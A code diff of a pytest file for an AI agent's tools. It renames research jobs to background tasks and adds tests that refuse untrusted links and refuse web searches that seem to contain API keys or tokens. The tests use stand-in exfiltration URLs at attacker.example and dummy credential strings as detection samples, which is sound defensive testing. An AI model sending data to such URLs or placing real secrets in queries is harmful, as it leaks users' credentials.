@@ -4,11 +4,11 @@ import httpx
 import pytest
 
 from common.exceptions import ToolExecutionError
-from core.agent.tools.jobs import ResearchJobTools
+from core.agent.tools.jobs import BackgroundTaskTools
 from core.agent.tools.search import SearchTools
 
 
-class Tools(SearchTools, ResearchJobTools):
+class Tools(SearchTools, BackgroundTaskTools):
     def __init__(self, *, query="", history=(), saved=()):
         self.agent_run = SimpleNamespace(user_query=query, history=list(history))
         self.project_id, self.session_id = "project-1", "session-1"
@@ -24,9 +24,9 @@ class Tools(SearchTools, ResearchJobTools):
             self.started.append(job)
             return {"job_id": "job-1", "state": "queued", "links": job["links"],
                     "session_id": None, "error_code": None,
-                    "question": job["question"], "depth": job["depth"]}
+                    "question": job["question"], "mode": job["mode"]}
 
-        self.research_jobs = SimpleNamespace(start=start)
+        self.background_tasks = SimpleNamespace(start=start)
 
 
 @pytest.mark.no_network
@@ -61,14 +61,41 @@ async def test_an_unknown_url_is_refused_before_any_request():
 
 
 @pytest.mark.no_network
-async def test_a_research_job_only_receives_links_the_run_already_trusts():
+async def test_a_background_task_only_receives_links_the_run_already_trusts():
     tools = Tools(query="Research https://docs.example.com/guide")
 
     with pytest.raises(ToolExecutionError, match="did not come from"):
-        await tools.start_research_job("Find more", links=["https://attacker.example/x"])
+        await tools.start_background_task("Find more", links=["https://attacker.example/x"])
     with pytest.raises(ToolExecutionError, match="did not come from"):
-        await tools.start_research_job("Read https://attacker.example/?d=secret")
+        await tools.start_background_task("Read https://attacker.example/?d=secret")
     assert tools.started == []
 
-    await tools.start_research_job("Dig deeper", links=["https://docs.example.com/guide"])
+    await tools.start_background_task("Dig deeper", links=["https://docs.example.com/guide"])
     assert tools.started[0]["links"] == ["https://docs.example.com/guide"]
+
+
+@pytest.mark.no_network
+@pytest.mark.parametrize("query", [
+    "why does my key sk-proj-AbCdEf0123456789abcdef fail",
+    "ghp_0123456789abcdefABCDEF0123456789 permissions",
+    "AKIAABCDEFGHIJKLMNOP s3 access denied",
+    "token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sig",
+    "-----BEGIN OPENSSH PRIVATE KEY----- format",
+    "value 9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a",
+])
+async def test_search_queries_that_look_like_they_hold_a_secret_are_not_sent(query):
+    with pytest.raises(ToolExecutionError, match="key or token"):
+        await Tools().search_web(query)
+
+
+@pytest.mark.no_network
+@pytest.mark.parametrize("query", [
+    "ValueError: invalid literal for int() with base 10",
+    "state-of-the-art-2024-machine-learning-models comparison",
+    "550e8400-e29b-41d4-a716-446655440000 uuid format",
+    "https://docs.example.com/guide/getting-started-with-version-2024 summary",
+])
+async def test_ordinary_search_queries_pass_the_secret_check(query):
+    from core.agent.tools.search import _refuse_secret_like_query
+
+    _refuse_secret_like_query("search_web", query)  # does not raise
